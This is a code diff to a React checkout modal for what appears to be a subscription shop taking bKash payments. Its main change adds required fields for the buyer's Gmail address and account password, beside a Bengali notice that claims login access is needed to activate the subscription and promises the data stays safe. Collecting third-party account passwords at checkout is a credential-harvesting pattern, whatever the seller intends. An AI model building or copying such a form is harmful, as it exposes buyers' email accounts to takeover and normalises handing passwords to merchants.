@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 import { Product } from '../types';
-import { CheckCircle2, Lock, Loader2, Mail, Smartphone } from 'lucide-react';
+import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle } from 'lucide-react';
 
 interface CheckoutModalProps {
   isOpen: boolean;
@@ -19,6 +19,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 }) => {
   const [step, setStep] = useState<'details' | 'processing' | 'success'>('details');
   const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
   const [method, setMethod] = useState<PaymentMethod>('bkash');
   const [senderNumber, setSenderNumber] = useState('');
   const [trxId, setTrxId] = useState('');
@@ -36,6 +37,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
         onSuccess();
         setStep('details');
         setEmail('');
+        setPassword('');
         setSenderNumber('');
         setTrxId('');
       }, 3000);
@@ -53,7 +55,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 
   return (
     <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-      <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative">
+      <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative max-h-[90vh] overflow-y-auto">
         
         {step === 'details' && (
           <form onSubmit={handlePay} className="p-8">
@@ -71,23 +73,47 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 <div className="text-2xl font-bold text-white">৳{total.toLocaleString('bn-BD')}</div>
               </div>
 
-              <div>
-                <label className="block text-slate-400 text-sm font-medium mb-2">ইমেইল অ্যাড্রেস</label>
-                <div className="relative">
-                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
-                  <input 
-                    type="email" 
-                    required 
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    placeholder="আপনার ইমেইল দিন"
-                    className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
-                  />
+              {/* Account Credentials Section */}
+              <div className="space-y-3 pt-2">
+                <div>
+                  <label className="block text-slate-400 text-sm font-medium mb-2">আপনার জিমেইল (Gmail)</label>
+                  <div className="relative">
+                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <input 
+                      type="email" 
+                      required 
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="example@gmail.com"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
+                    />
+                  </div>
                 </div>
-                <p className="text-xs text-slate-500 mt-2">এই ইমেইলে আপনার অ্যাকাউন্টের বিবরণ পাঠানো হবে।</p>
+
+                <div>
+                  <label className="block text-slate-400 text-sm font-medium mb-2">অ্যাকাউন্ট পাসওয়ার্ড</label>
+                  <div className="relative">
+                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <input 
+                      type="password" 
+                      required 
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      placeholder="আপনার পাসওয়ার্ড দিন"
+                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
+                    />
+                  </div>
+                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 mt-3 flex gap-2">
+                    <AlertTriangle className="text-yellow-500 shrink-0" size={16} />
+                    <p className="text-xs text-yellow-200/80 leading-relaxed">
+                       পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড পরিবর্তন করে নিতে পারবেন।
+                    </p>
+                  </div>
+                </div>
               </div>
 
-              <div>
+              {/* Payment Section */}
+              <div className="pt-4 border-t border-slate-800">
                 <label className="block text-slate-400 text-sm font-medium mb-2">পেমেন্ট মেথড সিলেক্ট করুন</label>
                 <div className="grid grid-cols-4 gap-2 mb-4">
                   {methods.map((m) => (
@@ -165,8 +191,8 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
               <CheckCircle2 size={32} className="text-green-500" />
             </div>
             <h3 className="text-2xl font-bold text-white mb-2">অর্ডার সফল হয়েছে!</h3>
-            <p className="text-slate-400 mb-6">আপনার সাবস্ক্রিপশন তথ্য ({email}) ইমেইলে পাঠানো হয়েছে।</p>
-            <p className="text-xs text-slate-600">রিডাইরেক্ট করা হচ্ছে...</p>
+            <p className="text-slate-400 mb-6">শিগগিরই আপনার অ্যাকাউন্টে সাবস্ক্রিপশন চালু করে ইমেইল কনফার্মেশন পাঠানো হবে।</p>
+            <p className="text-xs text-slate-600">উইন্ডোটি বন্ধ হচ্ছে...</p>
           </div>
         )}
       </div>
